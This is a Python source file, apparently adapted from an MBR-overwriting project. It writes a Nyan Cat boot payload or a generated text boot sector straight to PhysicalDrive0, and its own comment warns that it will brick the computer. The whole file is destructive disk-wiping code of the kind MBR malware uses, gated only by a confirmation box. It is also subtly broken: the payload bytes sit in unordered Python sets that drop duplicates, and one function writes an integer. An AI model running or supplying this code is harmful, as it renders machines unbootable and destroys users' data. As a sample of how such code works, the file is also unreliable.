#credits to https://github.com/Itzsten/Python-MBR-Overwriting/
#WARNING: this code will brick your PC!
#this code don`t, so it can contain bugs or not work

from win32file import *
import win32con
from message_box import MessageBox, MessageBoxButton
from os import system, getcwd
from enum import Enum

NYANCAT_HEX = {0x0E, 0x1F, 0x0E, 0x07, 0xFC, 0xB9, 0x19, 0x00, 0xBF, 0xBB, 0x7D, 0x0F,
0x31, 0x96, 0x31, 0xF0, 0xC1, 0xC6, 0x07, 0xAB, 0xE2, 0xF5, 0xB8, 0x13,
0x00, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07, 0x6A, 0x04, 0x06, 0xBD, 0x80,
0x02, 0x31, 0xFF, 0xB8, 0x7E, 0x00, 0x31, 0xC9, 0x49, 0xF3, 0xAA, 0xBF,
0x00, 0x50, 0xB1, 0x05, 0x57, 0x01, 0xEF, 0xF7, 0xDD, 0x51, 0xB1, 0x05,
0xB0, 0x28, 0xBB, 0x18, 0x00, 0xBA, 0x0C, 0x00, 0xE8, 0xBB, 0x00, 0x04,
0x04, 0xE2, 0xF3, 0x59, 0x5F, 0x83, 0xC7, 0x18, 0xE2, 0xE2, 0x01, 0xEF,
0x57, 0xB1, 0x19, 0xBB, 0xBB, 0x7D, 0x83, 0x2F, 0x04, 0x8B, 0x3F, 0x80,
0x3F, 0x28, 0x77, 0x0D, 0xBE, 0xA5, 0x7D, 0x7A, 0x03, 0xBE, 0xB0, 0x7D,
0x53, 0xE8, 0x7E, 0x00, 0x5B, 0x43, 0x43, 0xE2, 0xE5, 0xB1, 0x03, 0xBF,
0x64, 0x73, 0xBB, 0x0C, 0x00, 0x31, 0xC0, 0xE8, 0x7E, 0x00, 0x81, 0xC7,
0x04, 0xF6, 0xB0, 0x19, 0xB2, 0x04, 0xE8, 0x75, 0x00, 0x81, 0xC7, 0xF0,
0xF5, 0x29, 0xEF, 0x29, 0xEF, 0xE2, 0xE3, 0x5F, 0xBE, 0x50, 0x7D, 0xE8,
0x77, 0x00, 0xE8, 0x71, 0x00, 0x58, 0x5A, 0xF7, 0xD8, 0x79, 0x04, 0xF7,
0xDD, 0xF7, 0xDA, 0xF7, 0xDD, 0x52, 0x50, 0x29, 0xD7, 0x81, 0xC7, 0x2C,
0x1E, 0xE8, 0x5A, 0x00, 0xB1, 0x05, 0xE8, 0x31, 0x00, 0xE2, 0xFB, 0x81,
0xC7, 0xB8, 0x09, 0xE8, 0x84, 0x00, 0x83, 0xC7, 0x14, 0xE8, 0x7E, 0x00,
0x83, 0xC7, 0x24, 0xE8, 0x78, 0x00, 0x83, 0xC7, 0x18, 0xE8, 0x72, 0x00,
0x99, 0x41, 0xB4, 0x86, 0xCD, 0x15, 0xBA, 0xDA, 0x03, 0xED, 0xA8, 0x08,
0x74, 0xFB, 0xED, 0xA8, 0x08, 0x75, 0xFB, 0xE9, 0x37, 0xFF, 0xAC, 0x93,
0xAC, 0x92, 0xAC, 0x3C, 0x04, 0x74, 0x1A, 0xE8, 0x3C, 0x00, 0x92, 0xE8,
0x02, 0x00, 0xEB, 0xF1, 0x89, 0xDA, 0x51, 0x57, 0x89, 0xD9, 0xF3, 0xAA,
0x5F, 0x81, 0xC7, 0x40, 0x01, 0x4A, 0x75, 0xF3, 0x59, 0xC3, 0xE8, 0x00,
0x00, 0xAC, 0xE8, 0x1D, 0x00, 0x57, 0x31, 0xC0, 0xAC, 0x91, 0xAC, 0x93,
0xAC, 0x92, 0xAC, 0x60, 0xE8, 0xDB, 0xFF, 0x61, 0x80, 0xEA, 0x08, 0x80,
0xC3, 0x08, 0x81, 0xC7, 0xFC, 0x04, 0xE2, 0xEF, 0x5F, 0xC3, 0x30, 0xE4,
0xC1, 0xE0, 0x02, 0x01, 0xC7, 0xC1, 0xE8, 0x07, 0x69, 0xC0, 0x80, 0x04,
0x05, 0xD8, 0xEB, 0x01, 0xC7, 0xC3, 0x60, 0xE8, 0xC4, 0xFF, 0x61, 0xC3,
0x6A, 0x03, 0x48, 0x48, 0x00, 0xAA, 0x02, 0x48, 0x40, 0x59, 0xAC, 0x03,
0x38, 0x38, 0x3C, 0x8A, 0x04, 0x28, 0x28, 0x00, 0xAA, 0x03, 0x28, 0x20,
0x19, 0x10, 0x19, 0x28, 0x14, 0x04, 0x08, 0x41, 0xE1, 0x55, 0x04, 0x08,
0x00, 0x01, 0x51, 0x04, 0x04, 0x0F, 0x43, 0x71, 0x04, 0x04, 0x00, 0x20,
0x4A, 0x4A, 0x4A, 0x4B, 0x6B, 0x8B, 0x8A, 0x71, 0x4A, 0x4B, 0x6B, 0x8B,
0x8A, 0x8A, 0x8A, 0xC5, 0xA6, 0x8A, 0x6B, 0x6B, 0x6B, 0x6B, 0x6B, 0x6B,
0x4A, 0x67, 0x04, 0x8A, 0x02, 0x08, 0x0C, 0x00, 0xAA, 0x01, 0x08, 0x04,
0x19, 0x04, 0x0F, 0x8A, 0x0A, 0x8A, 0xA7, 0x6B, 0x6E, 0x6B, 0xA7, 0x8A,
0x04, 0x0F, 0x2A, 0x8C, 0xAB, 0xA9, 0x88, 0x48, 0x29, 0x2B, 0x04}

class BIOScolor(Enum):
    #source: https://en.wikipedia.org/wiki/BIOS_color_attributes
    BLACK = 'Black'
    BLUE = 'Blue'
    GREEN = 'Green'
    CYAN = 'Cyan'
    RED = 'Red'
    MAGENTA = 'Magenta'
    BROWN = 'Brown'
    LGRAY = 'Light Gray'
    DGRAY = 'Dark Gray'
    LBLUE = 'Light Blue'
    LGREEN = 'Light Green'
    LCYAN = 'Light Cyan'
    LRED = 'Light Red'
    LMAGENTA = 'Light Magenta'
    YELLOW = 'Yellow'
    WHITE = 'White'

def _text_to_hex(text: str, color: BIOScolor = BIOScolor.WHITE):
    #tutorial: https://youtu.be/qrRGprIIOgo?si=fXI4gwxHFuDI1uBF&t=223
    with open(fr'{getcwd()}\NASM\clutter.asm', 'w') as fl:
        fl.write(f"""[BITS 16]
[ORG 7C00h]
    jmp     main
main:
    xor     ax, ax     ; DS=0
    mov     ds, ax
    cld                ; DF=0 because our LODSB requires it
    mov     ax, 0012h  ; Select 640x480 16-color graphics video mode
    int     10h
    mov     si, string
    mov     bl, 9      ; {color.value}
    call    printstr
    jmp     $

printstr:
    mov     bh, 0     ; DisplayPage
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh   ; BIOS.Teletype
    int     10h
    jmp     print
done:
    ret

string db "{text.replace('\n', '", 13, 10, "')}"

times 510 - ($-$$) db 0
dw      0AA55h""")
    system(r'.\NASM\nasm -f bin NASM\clutter.asm -o NASM\clutter.bin')
    system(r'.\NASM\HexFileConverter.exe NASM\clutter.bin')
    with open(fr'{getcwd()}\NASM\clutter.bin.hex') as fl:
        hex_data = fl.read()
    return {eval('0x' + data.rstrip('\n')) for data in hex_data.split()}

def reset():
    box = MessageBox('Warning', 'Do you really want ot reset your MBR?', button=MessageBoxButton.YN)
    box.show()
    if box.result_bool:
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None, win32con.OPEN_EXISTING, 0,0)
        WriteFile(hDevice, 0, None)
        CloseHandle(hDevice)

def overwrite_text(text: str, color: BIOScolor):
    box = MessageBox('Warning', 'Do you really want ot reset your MBR?', button=MessageBoxButton.YN)
    box.show()
    if box.result_bool:
        hex_data = _text_to_hex(text, color)
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None, win32con.OPEN_EXISTING, 0,0)
        WriteFile(hDevice, hex_data, None)
        CloseHandle(hDevice)

def overwrite_hex(hex_data):
    box = MessageBox('Warning', 'Do you really want ot reset your MBR?', button=MessageBoxButton.YN)
    box.show()
    if box.result_bool:
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None, win32con.OPEN_EXISTING, 0,0)
        WriteFile(hDevice, hex_data, None)
        CloseHandle(hDevice)